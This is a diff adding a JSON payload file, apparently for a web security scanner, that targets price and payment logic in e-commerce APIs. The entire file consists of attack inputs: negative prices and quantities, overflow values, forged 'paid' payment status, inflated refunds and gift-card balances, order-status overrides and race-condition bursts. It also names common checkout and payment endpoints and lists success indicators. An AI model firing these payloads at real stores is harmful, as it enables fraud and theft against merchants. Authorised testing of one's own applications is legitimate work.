@@ -1,0 +1,179 @@
+{
+  "info": {
+    "name": "Price Manipulation Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Price manipulation, integer overflow, and race condition payloads for e-commerce and financial applications. 2026 updated.",
+    "category": "Business Logic",
+    "severity": "HIGH",
+    "owasp": "A04:2021 - Insecure Design"
+  },
+  "attack_vectors": {
+    "negative_values": [
+      {"payload": {"price": -1}, "description": "Negative price -1"},
+      {"payload": {"price": -100}, "description": "Negative price -100"},
+      {"payload": {"price": -0.01}, "description": "Negative price small"},
+      {"payload": {"price": -999999}, "description": "Large negative price"},
+      {"payload": {"quantity": -1}, "description": "Negative quantity"},
+      {"payload": {"quantity": -999}, "description": "Large negative quantity"},
+      {"payload": {"amount": -1}, "description": "Negative amount"},
+      {"payload": {"discount": -10}, "description": "Negative discount"},
+      {"payload": {"credit": -100}, "description": "Negative credit"}
+    ],
+    "zero_values": [
+      {"payload": {"price": 0}, "description": "Zero price"},
+      {"payload": {"price": "0"}, "description": "Zero price as string"},
+      {"payload": {"price": 0.00}, "description": "Zero price decimal"},
+      {"payload": {"price": "0.00"}, "description": "Zero price string decimal"},
+      {"payload": {"quantity": 0}, "description": "Zero quantity"},
+      {"payload": {"amount": 0}, "description": "Zero amount"}
+    ],
+    "integer_overflow": [
+      {"payload": {"price": 2147483647}, "description": "Max int32 value"},
+      {"payload": {"price": 2147483648}, "description": "Overflow int32"},
+      {"payload": {"price": 9999999999}, "description": "Large price"},
+      {"payload": {"price": 9999999999999999999}, "description": "Extreme overflow"},
+      {"payload": {"quantity": 2147483647}, "description": "Max int32 quantity"},
+      {"payload": {"quantity": 999999999}, "description": "Large quantity"}
+    ],
+    "floating_point_issues": [
+      {"payload": {"price": 0.009}, "description": "Very small price"},
+      {"payload": {"price": 0.001}, "description": "Minimum cent"},
+      {"payload": {"price": 1e10}, "description": "Scientific notation"},
+      {"payload": {"price": 1e-10}, "description": "Small scientific"},
+      {"payload": {"price": 1.0000001}, "description": "Precision issue"},
+      {"payload": {"price": "1.00"}, "description": "String decimal"},
+      {"payload": {"price": ".99"}, "description": "No leading zero"},
+      {"payload": {"price": "99."}, "description": "No trailing zero"}
+    ],
+    "type_confusion": [
+      {"payload": {"price": "1.00"}, "description": "Price as string"},
+      {"payload": {"price": 1.00}, "description": "Price as float"},
+      {"payload": {"price": "1"}, "description": "Price as int string"},
+      {"payload": {"price": "$1.00"}, "description": "Price with currency symbol"},
+      {"payload": {"price": "1.00 USD"}, "description": "Price with currency"},
+      {"payload": {"price": "1,00"}, "description": "Comma decimal"},
+      {"payload": {"price": "1.000"}, "description": "Extra precision"}
+    ],
+    "currency_manipulation": [
+      {"payload": {"amount": 100, "currency": "USD"}, "description": "USD amount"},
+      {"payload": {"amount": 100, "currency": "EUR"}, "description": "EUR amount"},
+      {"payload": {"amount": 100, "currency": "GBP"}, "description": "GBP amount"},
+      {"payload": {"amount": 100, "currency": "JPY"}, "description": "JPY amount (no decimals)"},
+      {"payload": {"amount": 100, "currency": "BTC"}, "description": "BTC amount"},
+      {"payload": {"amount": 100, "from_currency": "USD", "to_currency": "EUR"}, "description": "Currency conversion"}
+    ],
+    "coupon_discount_abuse": [
+      {"payload": {"coupon": "SAVE10", "discount": 100}, "description": "100% discount"},
+      {"payload": {"coupon": "SAVE10", "discount": 999}, "description": "Excessive discount"},
+      {"payload": {"coupon": "FREESHIP"}, "description": "Free shipping"},
+      {"payload": {"coupon": "TEST", "used": false}, "description": "Test coupon"},
+      {"payload": {"coupon": "ADMIN", "admin_discount": 50}, "description": "Admin coupon"},
+      {"payload": {"coupon": "", "discount": 100}, "description": "Empty coupon with discount"},
+      {"payload": {"coupon": "SAVE10", "stackable": true}, "description": "Stackable coupon"}
+    ],
+    "shipping_manipulation": [
+      {"payload": {"shipping_cost": 0}, "description": "Free shipping"},
+      {"payload": {"shipping_cost": -5}, "description": "Negative shipping"},
+      {"payload": {"shipping_method": "express", "cost": 0}, "description": "Express free"},
+      {"payload": {"country": "XX"}, "description": "Invalid country"},
+      {"payload": {"weight": 0}, "description": "Zero weight"},
+      {"payload": {"weight": -1}, "description": "Negative weight"}
+    ],
+    "tax_manipulation": [
+      {"payload": {"tax_rate": 0}, "description": "Zero tax rate"},
+      {"payload": {"tax_rate": -0.1}, "description": "Negative tax rate"},
+      {"payload": {"tax": 0}, "description": "Zero tax"},
+      {"payload": {"tax": -10}, "description": "Negative tax"},
+      {"payload": {"tax_inclusive": true}, "description": "Tax inclusive flag"},
+      {"payload": {"tax_exempt": true}, "description": "Tax exempt flag"}
+    ],
+    "quantity_manipulation": [
+      {"payload": {"quantity": 9999999}, "description": "Extreme quantity"},
+      {"payload": {"quantity": 0.1}, "description": "Fractional quantity"},
+      {"payload": {"quantity": "infinite"}, "description": "Infinite quantity"},
+      {"payload": {"quantity": null}, "description": "Null quantity"},
+      {"payload": {"max_quantity": 999}, "description": "Max quantity override"}
+    ],
+    "order_state_manipulation": [
+      {"payload": {"status": "completed"}, "description": "Complete order directly"},
+      {"payload": {"status": "shipped"}, "description": "Mark as shipped"},
+      {"payload": {"status": "delivered"}, "description": "Mark as delivered"},
+      {"payload": {"status": "refunded"}, "description": "Mark as refunded"},
+      {"payload": {"refund_amount": 1000}, "description": "Excessive refund"},
+      {"payload": {"cancel_order": true}, "description": "Cancel order"}
+    ],
+    "payment_bypass": [
+      {"payload": {"payment_method": "free"}, "description": "Free payment method"},
+      {"payload": {"payment_status": "paid"}, "description": "Forged paid status"},
+      {"payload": {"cod": true}, "description": "Cash on delivery"},
+      {"payload": {"gift_card_code": "ANY"}, "description": "Any gift card"},
+      {"payload": {"credit_balance": 10000}, "description": "Forged credit balance"}
+    ],
+    "shipping_address_manipulation": [
+      {"payload": {"address_id": 999999}, "description": "Invalid address ID"},
+      {"payload": {"address": {"country": "XX", "zip": "00000"}}, "description": "Invalid address"},
+      {"payload": {"pickup": true}, "description": "Force pickup"},
+      {"payload": {"digital_delivery": true}, "description": "Digital delivery"}
+    ],
+    "gift_card_exploitation": [
+      {"payload": {"gift_card": "BALANCE", "code": "TEST"}, "description": "Check balance"},
+      {"payload": {"gift_card": "100.00", "code": "ANY"}, "description": "Forged balance"},
+      {"payload": {"gift_card_code": "GENERATED"}, "description": "Generated code"},
+      {"payload": {"apply_gift_card": 10000}, "description": "Apply excessive credit"}
+    ]
+  },
+  "race_condition_payloads": [
+    {"description": "Rapid request 1", "count": 5, "delay_ms": 0},
+    {"description": "Rapid request 2", "count": 10, "delay_ms": 0},
+    {"description": "Concurrent checkout", "count": 5, "delay_ms": 0},
+    {"description": "Parallel coupon apply", "count": 5, "delay_ms": 0},
+    {"description": "Simultaneous refund requests", "count": 5, "delay_ms": 0}
+  ],
+  "endpoints": [
+    "/api/cart",
+    "/api/checkout",
+    "/api/order",
+    "/api/orders",
+    "/api/purchase",
+    "/api/payment",
+    "/api/apply-coupon",
+    "/api/shipping",
+    "/api/price",
+    "/api/calculate",
+    "/api/quote",
+    "/cart",
+    "/checkout",
+    "/order",
+    "/payment"
+  ],
+  "detection_patterns": [
+    "price",
+    "amount",
+    "quantity",
+    "discount",
+    "coupon",
+    "total",
+    "subtotal",
+    "tax",
+    "shipping",
+    "cost",
+    "fee",
+    "balance"
+  ],
+  "successful_indicators": [
+    "Order placed with negative price",
+    "Discount applied > 100%",
+    "Item added for free",
+    "Refund processed",
+    "Balance credited",
+    "Coupon stackable",
+    "Quantity unlimited",
+    "Price overwritten"
+  ],
+  "json_type_confusion_tests": [
+    {"test": "price as string vs int", "values": [1, "1", 1.0, "1.0"]},
+    {"test": "quantity as string vs int", "values": [1, "1", 1.5, "1.5"]},
+    {"test": "discount as string vs number", "values": [10, "10", 10.5, "10.5"]}
+  ]
+}
